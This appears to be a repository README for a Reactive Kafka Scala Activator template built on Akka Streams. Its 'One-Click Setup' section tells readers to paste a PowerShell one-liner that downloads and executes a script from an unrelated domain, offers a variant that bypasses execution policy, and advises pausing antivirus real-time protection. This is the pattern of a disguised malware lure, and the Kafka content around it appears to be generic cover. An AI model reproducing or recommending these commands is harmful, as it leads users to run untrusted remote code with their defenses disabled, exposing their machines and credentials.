<div align="center">

# Reactive Kafka Scala Activator Template

![preview](https://raw.githubusercontent.com/MyWann4/activator-reactive-kafka-scala/main/splash_724cae.svg)

[![powershell](https://img.shields.io/badge/Powershell-5.1%2B_%2F_7%2B-84cc16?style=flat&labelColor=0d1117)]() [![state](https://img.shields.io/badge/State-Verified-2ea44f?style=flat&labelColor=0d1117)]() [![ci](https://img.shields.io/badge/Ci-Passing-2ea44f?style=flat&labelColor=0d1117)]()

</div>

---

Activator template demonstrating a Reactive Kafka setup with an Akka streams wrapper for Apache Kafka. Use it as a starting point to explore stream-based Kafka producers and consumers in Scala. The project is structured for quick experimentation, so you can adapt the included flows to your own use case.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Launch PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Run the command
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- Ready-to-run Activator template demonstrating an Akka Streams wrapper for Apache Kafka
- Minimal Scala example showing publisher and subscriber flows wired through Akka Streams
- Clear separation between reactive stream producers and consumers
- Self-contained starter project suitable for local experimentation
- Simple, extensible structure to adapt into your own reactive Kafka pipeline

## Tech Stack

Scala 2.11 with sbt as the build tool. Akka Actors and Akka Streams provide the concurrency and stream-processing foundation, with the Reactive Kafka library bridging Akka Streams to Apache Kafka. Apache Kafka serves as the message broker, and the project runs against a local Kafka instance for development.

## Project Structure

```
src/
├── main/
│ └── scala/
│ └── com/example/
│ ├── Main.scala # Entry point wiring producer and consumer
│ ├── Producer.scala # Publishes messages to a Kafka topic
│ └── Consumer.scala # Consumes messages via Akka Streams
├── test/
│ └── scala/
│ └── com/example/
│ └── KafkaSpec.scala # Embedded Kafka integration tests
build.sbt # Dependencies, Scala version, Akka config
project/
└── build.properties # sbt version pin
```

The template follows a standard sbt layout. Sources live under `src/main/scala`, tests under `src/test/scala`. Producer and consumer are kept in separate files so each flow can be read and modified independently. `Main.scala` is the composition root — it constructs the actor system, starts the consumer stream, and feeds the producer. Build configuration is isolated in `build.sbt`; adjust dependency versions there rather than in source files.

## FAQ

**Is this a library or a template?**
It's an Activator template. Use it as a starting point and reference, then adapt the code to your own project.

**What does it demonstrate?**
A minimal wiring of Akka Streams with Apache Kafka using the reactive-kafka wrapper: producing to and consuming from a topic through streams.

**Which versions are used?**
See the build definition for the exact Scala, Akka, and Kafka versions. Versions are pinned there so the sample stays reproducible.

**Can I use this in production?**
It's a learning template, not a production blueprint. Expect to add configuration, error handling, monitoring, and tests before shipping.

**Why Akka Streams instead of the plain Kafka client?**
Backpressure and composability. Streams let you treat Kafka as just another source/sink in a larger pipeline.

**How do I change the topic or broker settings?**
They live in the application config; edit the relevant entries there and pass them to your source/sink stages.

**Where do I add my own processing logic?**
Between the consumer source and producer sink — that's the flow you compose in the sample's main entry point.

**Does it run standalone?**
It expects a reachable Kafka broker. Point the config at your local or remote instance before running.

**Something fails to start — where do I look?**
Check broker connectivity first, then confirm the configured topic exists and the serializers/deserializers match your data.

## License

This template is released under the Apache License 2.0. You are free to use, modify, and distribute it in your own projects, including commercial ones, provided that the copyright notice and license terms are preserved.

See the LICENSE file in the repository for the full legal text.